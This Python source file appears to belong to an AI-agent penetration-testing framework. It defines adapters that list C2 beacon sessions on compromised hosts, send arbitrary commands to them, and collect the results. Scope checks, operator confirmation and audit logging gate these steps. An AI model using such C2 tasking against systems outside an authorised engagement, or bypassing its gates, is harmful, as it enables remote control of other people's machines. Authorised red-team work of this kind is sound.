"""C2 适配器：与自研 C2 服务端的 REST 契约对接。

服务端需实现的契约（认证头 Authorization: Bearer <token>）：
  GET  {base}/api/sessions              → {"sessions": [{"id","host","user","last_seen","sleep","arch"}]}
  POST {base}/api/sessions/{id}/tasks   body {"type":"cmd","args":{"command": "..."}} → {"task_id"}
  GET  {base}/api/tasks/{task_id}       → {"status":"queued|running|done","output":"..."}

上下文变量（--var 或 engagement 配置注入）：c2_url、c2_token。
任务下发为利用级动作：requires_confirm + requires_finding，且会话主机必须在 scope 内。
"""

from __future__ import annotations

import json
import urllib.error
import urllib.request

from camty.adapters.base import RunContext, ToolAdapter, ToolResult
from camty.guardrail.scope import ScopeError
from camty.tools import ToolUnavailable


class C2Error(RuntimeError):
    pass


def _open(req: "urllib.request.Request", timeout: float):
    """回环地址绕过系统代理（Clash 等会把 127.0.0.1 也劫走导致超时）。"""
    from urllib.parse import urlparse
    from urllib.request import ProxyHandler, build_opener

    host = (urlparse(req.full_url).hostname or "").lower()
    if host in ("127.0.0.1", "localhost", "::1"):
        return build_opener(ProxyHandler({})).open(req, timeout=timeout)
    return urllib.request.urlopen(req, timeout=timeout)


def _c2_request(args: dict, method: str, path: str, body: dict | None = None) -> dict:
    base = str(args.get("c2_url", "")).rstrip("/")
    token = args.get("c2_token", "")
    if not base:
        raise C2Error("缺少 c2_url（--var c2_url=http://... 注入或写入 engagement 配置）")
    req = urllib.request.Request(
        base + path,
        data=json.dumps(body).encode("utf-8") if body is not None else None,
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        method=method,
    )
    try:
        with _open(req, 60) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        raise C2Error(f"C2 服务端 HTTP {exc.code}: {exc.read().decode(errors='replace')[:200]}") from exc
    except urllib.error.URLError as exc:
        raise C2Error(f"C2 服务端不可达: {exc.reason}（检查 c2_url 与网络）") from exc


class C2SessionsAdapter(ToolAdapter):
    name = "c2-sessions"
    description = "列出 C2 在线会话（beacon）：主机、用户、上次回连、休眠间隔。需要 c2_url/c2_token。"

    def available(self) -> bool:
        return True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "c2_url": {"type": "string", "description": "C2 服务端地址"},
                "c2_token": {"type": "string", "description": "C2 API token"},
            },
            "required": ["c2_url"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        body = _c2_request(args, "GET", "/api/sessions")
        sessions = body.get("sessions", [])
        in_scope = []
        for s in sessions:
            try:
                ctx.scope.require(s.get("host", ""))
                in_scope.append(s)
            except ScopeError:
                pass
        evidence = ctx.save_evidence(self.name, json.dumps(body, ensure_ascii=False, indent=2))
        ctx.audit.record(self.name, {}, ok=True, note=f"{len(sessions)} sessions")
        return ToolResult(
            summary=f"C2 会话 {len(sessions)} 个（范围内 {len(in_scope)}）",
            data={"sessions": sessions, "in_scope_sessions": in_scope},
            evidence=evidence,
        )


class C2TaskAdapter(ToolAdapter):
    name = "c2-task"
    description = "向 C2 会话下发命令任务（利用级，需 finding 门控与 operator 确认）。"
    requires_confirm = True
    requires_finding = True

    def available(self) -> bool:
        return True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "command": {"type": "string"},
                "c2_url": {"type": "string"},
                "c2_token": {"type": "string"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["session_id", "command", "c2_url", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        session_id = str(args["session_id"])
        body = _c2_request(args, "GET", "/api/sessions")
        target = next((s for s in body.get("sessions", []) if str(s.get("id")) == session_id), None)
        if target is None:
            raise C2Error(f"会话不存在: {session_id}")
        ctx.scope.require(target.get("host", ""))  # 范围外会话禁止下发
        resp = _c2_request(
            args,
            "POST",
            f"/api/sessions/{session_id}/tasks",
            {"type": "cmd", "args": {"command": args["command"]}},
        )
        task_id = resp.get("task_id", "")
        evidence = ctx.save_evidence(self.name, json.dumps(
            {"session": session_id, "host": target.get("host"), "command": args["command"],
             "finding_id": args.get("finding_id"), "resp": resp}, ensure_ascii=False, indent=2))
        ctx.audit.record(
            self.name,
            {"session": session_id, "host": target.get("host"), "command": args["command"],
             "finding_id": args.get("finding_id")},
            ok=True,
            note=f"task {task_id}",
        )
        return ToolResult(
            summary=f"任务已下发到 {target.get('host')}（task {task_id}）",
            data={"task_id": task_id, "session": session_id, "host": target.get("host")},
            evidence=evidence,
        )


class C2CollectAdapter(ToolAdapter):
    name = "c2-collect"
    description = "回收 C2 任务结果（按 task_id）。"

    def available(self) -> bool:
        return True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "task_id": {"type": "string"},
                "c2_url": {"type": "string"},
                "c2_token": {"type": "string"},
            },
            "required": ["task_id", "c2_url"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        task_id = str(args["task_id"])
        body = _c2_request(args, "GET", f"/api/tasks/{task_id}")
        output = body.get("output", "")
        evidence = ctx.save_evidence(self.name, json.dumps(body, ensure_ascii=False, indent=2))
        ctx.audit.record(self.name, {"task_id": task_id}, ok=True, note=body.get("status", ""))
        return ToolResult(
            summary=f"任务 {task_id} 状态 {body.get('status', '?')}（输出 {len(output)} 字符）",
            data={"task_id": task_id, "status": body.get("status", ""), "output": output[:4000]},
            evidence=evidence,
        )
